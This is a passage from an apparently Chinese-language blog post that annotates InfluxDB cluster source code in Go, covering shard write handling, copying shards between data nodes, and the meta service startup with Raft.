seriesKeysRequestMessage:</span><br><span class="line"><span class="comment">//s.statMap.Add(seriesKeysReq, 1)</span></span><br><span class="line"><span class="comment">//atomic.AddInt64(&amp;s.stats.FieldDimensionsReq, 1)</span></span><br><span class="line"><span class="comment">//s.processSeriesKeysRequest(conn)</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> copyShardRequestMessage:</span><br><span class="line">s.processCopyShardRequest(conn)   <span class="comment">//处理copy shared分片请求</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">s.Logger.Info(<span class="string">"cluster service message type not found"</span>, zap.Binary(<span class="string">"type"</span>, []<span class="keyword">byte</span>&#123;typ&#125;))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>processWriteShardRequest函数处理请求写操作，将数据写入shared分片中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">processWriteShardRequest</span><span class="params">(buf []<span class="keyword">byte</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="comment">// Build request</span></span><br><span class="line"><span class="keyword">var</span> req WriteShardRequest</span><br><span class="line"><span class="keyword">if</span> err := req.UnmarshalBinary(buf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">points := req.Points()</span><br><span class="line">atomic.AddInt64(&amp;s.stats.WriteShardPointsReq, <span class="keyword">int64</span>(<span class="built_in">len</span>(points)))</span><br><span class="line">err := s.TSDBStore.WriteToShard(req.ShardID(), points)</span><br><span class="line"></span><br><span class="line"><span class="comment">// We may have received a write for a shard that we don't have locally because the</span></span><br><span class="line"><span class="comment">// sending node may have just created the shard (via the metastore) and the write</span></span><br><span class="line"><span class="comment">// arrived before the local store could create the shard.  In this case, we need</span></span><br><span class="line"><span class="comment">// to check the metastore to determine what database and retention policy this</span></span><br><span class="line"><span class="comment">// shard should reside within.</span></span><br><span class="line"><span class="keyword">if</span> err == tsdb.ErrShardNotFound &#123;</span><br><span class="line">db, rp := req.Database(), req.RetentionPolicy()</span><br><span class="line"><span class="keyword">if</span> db == <span class="string">""</span> || rp == <span class="string">""</span> &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"drop write request. no database or rentention policy received"</span>, logger.Shard(req.ShardID()))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = s.TSDBStore.CreateShard(req.Database(), req.RetentionPolicy(), req.ShardID(), <span class="literal">true</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">atomic.AddInt64(&amp;s.stats.WriteShardFail, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"create shard %d: %s"</span>, req.ShardID(), err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = s.TSDBStore.WriteToShard(req.ShardID(), points)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">atomic.AddInt64(&amp;s.stats.WriteShardFail, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"write shard %d: %s"</span>, req.ShardID(), err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">atomic.AddInt64(&amp;s.stats.WriteShardFail, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"write shard %d: %s"</span>, req.ShardID(), err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析statements请求操作，并执行statement语句：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">processExecuteStatementRequest</span><span class="params">(buf []<span class="keyword">byte</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="comment">// Unmarshal the request.</span></span><br><span class="line"><span class="keyword">var</span> req ExecuteStatementRequest</span><br><span class="line"><span class="keyword">if</span> err := req.UnmarshalBinary(buf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parse the InfluxQL statement.</span></span><br><span class="line">stmt, err := influxql.ParseStatement(req.Statement())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理不同的删除操作</span></span><br><span class="line"><span class="keyword">return</span> s.executeStatement(stmt, req.Database())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WaitForTask用于同步influxdb节点之间数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *CopyShardTaskManager)</span> <span class="title">WaitForTask</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">if</span> t.Host == <span class="string">""</span> &#123;</span><br><span class="line">dataNodes, _ := t.MetaClient.DataNodes()   <span class="comment">//获取所有的数据节点</span></span><br><span class="line"><span class="keyword">for</span> _, nodeInfo := <span class="keyword">range</span> dataNodes &#123;</span><br><span class="line"><span class="keyword">if</span> nodeInfo.ID == t.Node.GetDataID() &#123;</span><br><span class="line">t.Host = nodeInfo.TCPHost</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">copyShards := t.MetaClient.CopyShardStatus()   <span class="comment">//拷贝需要的shared分片</span></span><br><span class="line">task := t.findTask(&amp;copyShards)          <span class="comment">//寻找task任务</span></span><br><span class="line"><span class="keyword">if</span> task != <span class="literal">nil</span> &#123;</span><br><span class="line">t.addRuningTask(task)</span><br><span class="line"><span class="keyword">go</span> task.Run()                  <span class="comment">//运行同步数据</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(t.IdleSleepSeconds)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run函数运行，task任务执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tk *CopyShardTask)</span> <span class="title">Run</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> tk.TaskManager.removeRuningTask(tk)   <span class="comment">//销毁正在运行的任务</span></span><br><span class="line"></span><br><span class="line">err := tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardCopying)  <span class="comment">//更新状态</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"update copy shard status to copying failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//同步数据更新函数</span></span><br><span class="line">err = tk.doTask()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"do copy shard failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="comment">//更新copy shared的状态，如果失败，则任务数据同步失败</span></span><br><span class="line">err = tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardFailed)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"update copy shard status to 'failed' failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//更新copyshared状态</span></span><br><span class="line">err = tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardSuccess)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"update copy shard status to success failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tk.Logger.Info(<span class="string">"update copy shard status to success"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>doTask函数执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tk *CopyShardTask)</span> <span class="title">doTask</span><span class="params">()</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line">nodeIDs := <span class="built_in">make</span>([]<span class="keyword">uint64</span>, <span class="number">1</span>)</span><br><span class="line">nodeIDs[<span class="number">0</span>] = tk.SrcNodeID</span><br><span class="line">conn, err := tk.Dialer.DialNode(nodeIDs)    <span class="comment">//获取连接</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"dial failed to copy shard"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write request.</span></span><br><span class="line"><span class="keyword">if</span> err = EncodeTLV(conn, copyShardRequestMessage, &amp;CopyShardRequest&#123;</span><br><span class="line">ShardID: tk.ShardID,    <span class="comment">//编码写请求</span></span><br><span class="line">&#125;); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"copy shard request failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read the response.</span></span><br><span class="line"><span class="keyword">var</span> resp CopyShardResponse</span><br><span class="line"><span class="keyword">if</span> _, err = DecodeTLV(conn, &amp;resp); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"copy shard response failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">tk.TotalSize = resp.TotalSize</span><br><span class="line"><span class="keyword">if</span> storeSD := tk.TaskManager.TSDBStore.Shard(tk.ShardID); storeSD == <span class="literal">nil</span> &#123;</span><br><span class="line">database, policy, _ := tk.TaskManager.MetaClient.ShardOwner(tk.ShardID)</span><br><span class="line"><span class="keyword">if</span> err = tk.TaskManager.TSDBStore.CreateShard(database, policy, tk.ShardID, <span class="literal">false</span>); err != <span class="literal">nil</span> &#123;   <span class="comment">//创建分片</span></span><br><span class="line">tk.Logger.Warn(<span class="string">"create shard failed"</span>,</span><br><span class="line">zap.String(<span class="string">"database"</span>, database),</span><br><span class="line">zap.String(<span class="string">"policy"</span>, policy),</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> _, err = os.Stat(storeSD.Path()); os.IsNotExist(err) &#123;</span><br><span class="line"><span class="keyword">if</span> err = tk.TaskManager.TSDBStore.DeleteShard(tk.ShardID); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"delete shard failed"</span>,</span><br><span class="line">zap.String(<span class="string">"database"</span>, storeSD.Database()),</span><br><span class="line">zap.String(<span class="string">"policy"</span>, storeSD.RetentionPolicy()),</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err = tk.TaskManager.TSDBStore.CreateShard(storeSD.Database(), storeSD.RetentionPolicy(), tk.ShardID, <span class="literal">false</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"create shard failed"</span>,</span><br><span class="line">zap.String(<span class="string">"database"</span>, storeSD.Database()),</span><br><span class="line">zap.String(<span class="string">"policy"</span>, storeSD.RetentionPolicy()),</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新建连接wrapper</span></span><br><span class="line">connWrapper := NewConnReaderWrapper(conn, tk)</span><br><span class="line"><span class="comment">//恢复shared</span></span><br><span class="line"><span class="keyword">if</span> err = tk.TaskManager.TSDBStore.RestoreShard(tk.ShardID, connWrapper); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"restore shard failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//conn io.Reader never get io.EOF err while RestoreShard, update here</span></span><br><span class="line">    <span class="comment">//更新copyshared处理，更新数据的主要过程</span></span><br><span class="line">err = tk.TaskManager.MetaClient.UpdateCopyShardProgress(tk.ID, tk.TotalSize, connWrapper.TotalReceived)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"copy shard process update failed:"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Uint64(<span class="string">"total"</span>, tk.TotalSize),</span><br><span class="line">zap.Uint64(<span class="string">"totalReceived"</span>, connWrapper.TotalReceived),</span><br><span class="line">zap.Error(err))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置shared可用</span></span><br><span class="line"><span class="keyword">if</span> err = tk.TaskManager.TSDBStore.SetShardEnabled(tk.ShardID, <span class="literal">true</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"enable shard failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加sharedowner节点</span></span><br><span class="line">err = tk.TaskManager.MetaClient.AddShardOwner(tk.ShardID, tk.TaskManager.Node.GetDataID())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"add shard owner failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tk.Logger.Info(<span class="string">"copy shard success"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还需要注意的地方就是influxdb中使用raft进行选主操作：</p><p>入口函数在启动meta服务的函数中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open starts the service</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">Open</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    </span><br><span class="line">s.Logger.Info(<span class="string">"Starting meta service"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.RaftListener == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"no raft listener set"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open listener.</span></span><br><span class="line"><span class="keyword">if</span> s.https &#123;</span><br><span class="line">cert, err := tls.LoadX509KeyPair(s.cert, s.cert)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">listener, err := tls.Listen(<span class="string">"tcp"</span>, s.httpAddr, &amp;tls.Config&#123;</span><br><span class="line">Certificates: []tls.Certificate&#123;cert&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.Logger.Info(<span class="string">"Listening on HTTPS"</span>, zap.String(<span class="string">"Addr"</span>, listener.Addr().String()))</span><br><span class="line">s.ln = listener</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">listener, err := net.Listen(<span class="string">"tcp"</span>, s.httpAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.Logger.Info(<span class="string">"Listening on HTTP"</span>, zap.String(<span class="string">"Addr"</span>, listener.Addr().String()))</span><br><span class="line">s.ln = listener</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// wait for the listeners to start</span></span><br><span class="line">timeout := time.Now().Add(raftListenerStartupTimeout)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">if</span> s.ln.Addr() != <span class="literal">nil</span> &amp;&amp; s.RaftListener.Addr() != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> time.Now().After(timeout) &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"unable to open without http listener running"</span>)</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(<span class="number">10</span> * time.Millisecond)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">if</span> autoAssignPort(s.httpAddr) &#123;</span><br><span class="line">s.httpAddr, err = combineHostAndAssignedPort(s.ln, s.httpAddr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> autoAssignPort(s.raftAddr) &#123;</span><br><span class="line">s.raftAddr, err = combineHostAndAssignedPort(s.RaftListener, s.raftAddr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the store.  The addresses passed in are remotely accessible.</span></span><br><span class="line">s.store = newStore(s.config, s.remoteAddr(s.httpAddr), s.remoteAddr(s.raftAddr))</span><br><span class="line">s.store.node = s.Node</span><br><span class="line"></span><br><span class="line">handler := newHandler(s.config, s)</span><br><span class="line">handler.logger = s.Logger</span><br><span class="line">handler.store = s.store</span><br><span class="line">s.handler = handler</span><br><span class="line"></span><br><span class="line"><span class="comment">// Begin listening for requests in a separate goroutine.</span></span><br><span class="line"><span class="comment">// s.serve should start before open as open needs httpd for peers</span></span><br><span class="line"><span class="keyword">go</span> s.serve()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := s.store.open(s.RaftListener); err != <span class="literal">nil</span> &#123;   <span class="comment">//开启raft监听</span></span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开raft:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 